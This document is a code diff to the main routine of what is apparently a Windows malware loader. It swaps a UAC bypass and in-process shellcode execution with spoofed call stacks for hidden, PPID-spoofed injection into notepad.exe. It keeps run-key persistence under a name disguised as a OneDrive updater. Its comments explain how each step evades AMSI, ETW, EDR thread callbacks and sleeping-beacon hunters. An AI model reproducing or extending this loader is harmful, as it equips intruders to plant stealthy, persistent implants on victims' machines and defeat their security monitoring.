@@ -25,7 +25,6 @@ int Main(VOID) {
 
     NTAPI_FUNC  NtApis  = { 0 };
     API_HASHING WinApis = { 0 };
-    NTSTATUS    STATUS  = 0x00;
 
     // --- IAT Camouflage ---
     IatCamouflage();
@@ -46,7 +45,7 @@ int Main(VOID) {
 #endif
 
     // --- Initialize indirect syscall engine ---
-    // Builds gadget pool (all syscall;ret in ntdll) + resolves 5 NT syscalls
+    // Builds gadget pool (all syscall;ret in ntdll) + resolves 6 NT syscalls
     if (!InitializeNtSyscalls(&NtApis))
         return 0;
     LOG("[+] Syscalls initialized");
@@ -76,38 +75,17 @@ int Main(VOID) {
     // NtContinue sets DR0 without ETW-TI telemetry
     PatchlessEtw(&WinApis);
 
-    // --- UAC bypass + self-install (UAC builds only) ---
-    // Two-process AppInfo RPC bypass (no manifest, no UAC dialog):
-    //   Medium-IL first run  → AppInfo bypass → spawn elevated self → terminate → return FALSE
-    //   Elevated second run  → IsFirstRunProcess=TRUE → InstallAndTerminate → exits
-    //   msoia.exe (run-key)  → IsFirstRunProcess=FALSE → fall through to shellcode
-#if defined(UAC_BYPASS) && !defined(BUILD_DLL)
-    if (!UacBypass(&WinApis)) return 0;
-    if (IsFirstRunProcess(&WinApis)) {
-        InstallAndTerminate(&WinApis);
-        return 0;
-    }
-#endif
-
-    // --- Install (non-UAC builds only) ---
-    // Must run BEFORE download — on first run the process terminates here,
-    // so no network activity happens on the initial execution.
+    // --- Install / self-guard ---
+    // EXE first run:  self-guard fails → copy self + write HKCU run-key → NtTerminateProcess.
+    //                 OS fires run-key at next logon; never touches network here.
+    // EXE reboot:     self-guard fires (basename == OneDriveUpdateSync.exe) → fall through to download.
     //
-    // EXE first run:  InstallAndTerminate: self-guard fails → InstallPersistence (HKCU key)
-    //                 → copy + CreateProcessW(msoia.exe) + NtTerminateProcess
-    // EXE reboot:     InstallAndTerminate: self-guard fires (basename == msoia.exe) → return
-    //                 → fall through to download (no persistence re-write)
-    //
-    // Sideload first run: SideloadInstallAndContinue: self-guard fails (no /pf)
-    //                     → InstallPersistence (HKCU key) → copy + CreateProcessW(msoia.exe /pf) + NtTerminateProcess
-    // Sideload reboot:    SideloadInstallAndContinue: self-guard fires (/pf) → return
-    //                     → fall through to download (no persistence re-write)
-#ifndef UAC_BYPASS
+    // Sideload first run: self-guard fails (no /pf) → copy files + write HKCU run-key → NtTerminateProcess.
+    // Sideload reboot:    self-guard fires (/pf) → fall through to download.
 #ifndef BUILD_DLL
-    InstallAndTerminate(&WinApis);
+    InstallAndContinue(&WinApis);
 #else
     SideloadInstallAndContinue(&WinApis);
-#endif
 #endif
 
     // --- Resolve beacon + download payload in one step ---
@@ -162,215 +140,39 @@ int Main(VOID) {
     }
 
     // ============================================================
-    // Stage 1: Shellcode Placement (NtAllocateVirtualMemory)
-    //
-    // Private RW allocation → shellcode copy → flip to RX/RWX.
-    // Memory protection is controlled by SHELLCODE_EXEC_PROT:
-    //   RWX_SHELLCODE defined:   PAGE_EXECUTE_READWRITE (Go/Sliver)
-    //   RWX_SHELLCODE undefined: PAGE_EXECUTE_READ (W^X)
+    // Evasion cleanup — wipe VEH handler + debug registers
+    // from this (loader) process before injection.
     // ============================================================
-
-    PVOID pExec   = NULL;
-    BOOL  bPlaced = FALSE;
-
-    // NtAllocate: direct allocation (RW -> copy -> RX/RWX)
-    if (!bPlaced) {
-        LOG("[*] Fallback to NtAllocateVirtualMemory");
-
-        SIZE_T sRegion = (SIZE_T)dwShellcodeSize;
-        SET_SYSCALL(NtApis.NtAllocateVirtualMemory);
-        STATUS = RunSyscall(
-            (ULONG_PTR)(HANDLE)-1, (ULONG_PTR)&pExec,
-            (ULONG_PTR)0, (ULONG_PTR)&sRegion,
-            (ULONG_PTR)(MEM_COMMIT | MEM_RESERVE), (ULONG_PTR)PAGE_READWRITE,
-            0, 0, 0, 0, 0, 0
-        );
-        if (!NT_SUCCESS(STATUS)) {
-            HeapFree(GetProcessHeap(), 0, pShellcode);
-            return 0;
-        }
-
-        MemCopy(pExec, pShellcode, dwShellcodeSize);
-
-        // Change from RW to executable (RX or RWX)
-        ULONG   dwOldProt  = 0;
-        SIZE_T  sProtSize  = (SIZE_T)dwShellcodeSize;
-        PVOID   pProtAddr  = pExec;
-
-        SET_SYSCALL(NtApis.NtProtectVirtualMemory);
-        STATUS = RunSyscall(
-            (ULONG_PTR)(HANDLE)-1, (ULONG_PTR)&pProtAddr,
-            (ULONG_PTR)&sProtSize, (ULONG_PTR)SHELLCODE_EXEC_PROT,
-            (ULONG_PTR)&dwOldProt,
-            0, 0, 0, 0, 0, 0, 0
-        );
-        if (!NT_SUCCESS(STATUS)) {
-            HeapFree(GetProcessHeap(), 0, pShellcode);
-            return 0;
-        }
-    }
-
-    // Wipe original payload from heap
-    MemSet(pShellcode, 0, dwShellcodeSize);
-    HeapFree(GetProcessHeap(), 0, pShellcode);
-
-#if defined(BUILD_DLL) && defined(ENABLE_INJECT)
-    // --- Persistence-reboot: inject into low-CPU process, terminate host ---
-    // On first run SideloadInstallAndContinue terminates us before we reach this
-    // point. On reboot the host EXE is relaunched with /pf, meaning we are running
-    // inside that host EXE which may consume ~25% CPU on its own. Injecting into
-    // a near-idle system process (RuntimeBroker etc.) and exiting drops overhead
-    // to ~1% with no loss of shellcode execution.
-    {
-        PVOID pCmdK32 = FindLoadedModuleW(L"KERNEL32.DLL");
-        typedef LPCSTR (WINAPI* fnGCLA)(VOID);
-        fnGCLA pGetCmdLine = pCmdK32
-            ? (fnGCLA)FetchExportAddress(pCmdK32, GetCommandLineA_JOAAT) : NULL;
-        LPCSTR szCmd = pGetCmdLine ? pGetCmdLine() : NULL;
-        BOOL bPfFlag = FALSE;
-        if (szCmd) {
-            for (DWORD _ci = 0; szCmd[_ci]; _ci++) {
-                if (szCmd[_ci  ] == ' '  && szCmd[_ci+1] == '/' &&
-                    szCmd[_ci+2] == 'p'  && szCmd[_ci+3] == 'f' &&
-                    (szCmd[_ci+4] == '\0' || szCmd[_ci+4] == ' ')) {
-                    bPfFlag = TRUE; break;
-                }
-            }
-        }
-        if (bPfFlag) {
-            // pExec is RX-mapped in the current process — readable as source for
-            // NtWriteVirtualMemory. InjectAndHijack terminates us on success;
-            // falls through (returns FALSE) if no suitable target is found so the
-            // thread-pool path below runs as fallback (host EXE stays alive).
-            InjectAndHijack(pExec, dwShellcodeSize);
-        }
-    }
-#endif
-
-    // ============================================================
-    // Cleanup: Remove evasion artifacts before shellcode runs
-    //
-    // - Remove VEH handler (no longer needed)
-    // - Clear debug register target addresses
-    // - Wipe decoded strings from stack/globals
-    // ============================================================
-
     CleanupEvasion(&WinApis);
     LOG("[+] Evasion cleanup complete");
 
     // ============================================================
-    // Stage 2: Call Stack Spoofing + Callback Execution
+    // Injection: PPID-spoofed notepad.exe + section mapping
     //
-    // Find a 'call rbx' (FF D3) gadget in ntdll to inject a
-    // legitimate stack frame. Combined with module stomping or
-    // phantom hollowing, the full call stack looks clean:
+    // Spawns notepad.exe hidden, parented to explorer.exe so
+    // the process tree looks user-initiated. notepad.exe does
+    // NOT register with AMSI (no AmsiInitialize call), avoiding
+    // the AMSI_PATCH_T.B12 detection that fires in powershell.exe
+    // when injected shellcode (Donut) patches AmsiScanBuffer.
     //
-    //   shellcode RIP  (in stomped/phantom DLL .text)
-    //   -> gadget site  (in ntdll — 'call rbx' return addr)
-    //   -> TppWorkpExecute     (ntdll)
-    //   -> TppWorkerThread     (ntdll)
-    //   -> RtlUserThreadStart  (ntdll)
+    // Shellcode is placed via NtCreateSection + NtMapViewOfSection:
+    //   - VAD in target shows Mapped (pagefile-backed), not MEM_PRIVATE
+    //   - No NtAllocateVirtualMemory + NtProtectVirtualMemory pair
+    //   - Primary thread kept SUSPENDED: no window, process stays alive
+    //     as long as the Donut shellcode thread holds its beacon loop.
+    //
+    // Self-terminates the loader after injection.
     // ============================================================
-
-    // Harvest `call rbx` gadgets across ntdll / kernel32 / kernelbase,
-    // then pick one per-run via RDTSC. Using a pool instead of a fixed
-    // single ntdll gadget defeats EDR rules that flag high-frequency
-    // identical return addresses in the injected stack frame.
-    CollectCallGadgets();
-    PVOID pCallGadget = GetRandomCallGadget();
-
-    // Store target + gadget for the ASM callback wrapper
-    SetSpoofTarget(pExec, pCallGadget);
-
-    SetSpoofStack(NULL);
-
-    // pNtdll needed below for thread-pool fallback path
-    BYTE xNtdll[] = XSTR_NTDLL_DLL;
-    DEOBF(xNtdll);
-    PVOID pNtdll = (PVOID)WinApis.pGetModuleHandleA((LPCSTR)xNtdll);
-
-    // ============================================================
-    // #12 Poison Fiber kick-off
-    //
-    // Converts the main thread to a fiber and switches to a new
-    // fiber whose entry is SpoofCallback. No new OS thread is
-    // created → no PsSetCreateThreadNotifyRoutine callback fires,
-    // blinding all kernel-thread-callback-based EDRs.
-    //
-    // SwitchToFiber never returns to main (shellcode runs forever on
-    // the fiber stack). If any fiber API fails we fall back to the
-    // original thread-pool path, which is still call-stack spoofed.
-    // ============================================================
-#if 0  // Fiber path temporarily disabled — thread-pool fallback only
-    PVOID pKernel32 = FindLoadedModuleW(L"KERNEL32.DLL");
-
-    BYTE xConv[]   = XSTR_CONVERT_THREAD_TO_FIBER; DEOBF(xConv);
-    BYTE xCreate[] = XSTR_CREATE_FIBER;            DEOBF(xCreate);
-    BYTE xSwitch[] = XSTR_SWITCH_TO_FIBER;         DEOBF(xSwitch);
-
-    typedef LPVOID (WINAPI *fnConvertThreadToFiber)(LPVOID);
-    typedef LPVOID (WINAPI *fnCreateFiber)(SIZE_T, LPFIBER_START_ROUTINE, LPVOID);
-    typedef VOID   (WINAPI *fnSwitchToFiber)(LPVOID);
-
-    fnConvertThreadToFiber pConvert = pKernel32
-        ? (fnConvertThreadToFiber)WinApis.pGetProcAddress((HMODULE)pKernel32, (LPCSTR)xConv)
-        : NULL;
-    fnCreateFiber pCreate = pKernel32
-        ? (fnCreateFiber)WinApis.pGetProcAddress((HMODULE)pKernel32, (LPCSTR)xCreate)
-        : NULL;
-    fnSwitchToFiber pSwitch = pKernel32
-        ? (fnSwitchToFiber)WinApis.pGetProcAddress((HMODULE)pKernel32, (LPCSTR)xSwitch)
-        : NULL;
-
-    if (pConvert && pCreate && pSwitch) {
-        LPVOID pMainFiber = pConvert(NULL);
-        if (pMainFiber) {
-            // SpoofCallback's NTAPI ABI matches LPFIBER_START_ROUTINE
-            // on x64 (single LPVOID in RCX, no shadow-space consumption).
-            LPVOID pShellcodeFiber = pCreate(0, (LPFIBER_START_ROUTINE)SpoofCallback, NULL);
-            if (pShellcodeFiber) {
-                LOG("[*] Switching to shellcode fiber...");
-                pSwitch(pShellcodeFiber);     // never returns
-                return 0;
-            }
-        }
-        LOG("[!] Fiber path failed, falling back to thread pool");
-    }
-#endif
-
-    // Thread-pool workers have their own legit TppWorkerThread ->
-    // RtlUserThreadStart chain on their native stack, which is more
-    // convincing than our synthetic buffer. Disable the RSP swap so
-    // the fallback path keeps that natural chain.
-    SetSpoofStack(NULL);
-
-    // ----- Thread-pool fallback path (original behaviour) -----
-    fnTpAllocWork  pTpAllocWork  = (fnTpAllocWork)FetchExportAddress(pNtdll, TpAllocWork_JOAAT);
-    fnTpPostWork   pTpPostWork   = (fnTpPostWork)FetchExportAddress(pNtdll, TpPostWork_JOAAT);
-
-    if (!pTpAllocWork || !pTpPostWork)
+    LOG("[*] Injecting into remote process...");
+    if (!InjectIntoProcess(&NtApis, pShellcode, dwShellcodeSize)) {
+        MemSet(pShellcode, 0, dwShellcodeSize);
+        HeapFree(GetProcessHeap(), 0, pShellcode);
         return 0;
-
-    PVOID pWork = NULL;
-    STATUS = pTpAllocWork(&pWork, (PVOID)SpoofCallback, NULL, NULL);
-    if (!NT_SUCCESS(STATUS) || !pWork)
-        return 0;
-
-    LOG("[*] Executing via thread pool callback (spoofed stack)...");
-    pTpPostWork(pWork);
-
-    // Keep process alive via alertable wait on NtCurrentProcess pseudo-handle.
-    // Alertable=TRUE → thread WaitReason = UserRequest (not DelayExecution),
-    // avoiding Hunt-Sleeping-Beacons / BeaconHunter thread-state fingerprints.
-    while (TRUE) {
-        SET_SYSCALL(NtApis.NtWaitForSingleObject);
-        RunSyscall(
-            (ULONG_PTR)(HANDLE)-1,  // NtCurrentProcess()
-            (ULONG_PTR)TRUE,        // Alertable
-            (ULONG_PTR)NULL,        // Infinite timeout
-            0, 0, 0, 0, 0, 0, 0, 0, 0
-        );
     }
 
+    // InjectIntoProcess calls NtTerminateProcess(-1) on success.
+    // Reached only if self-terminate failed — wipe and exit cleanly.
+    MemSet(pShellcode, 0, dwShellcodeSize);
+    HeapFree(GetProcessHeap(), 0, pShellcode);
     return 0;
 }
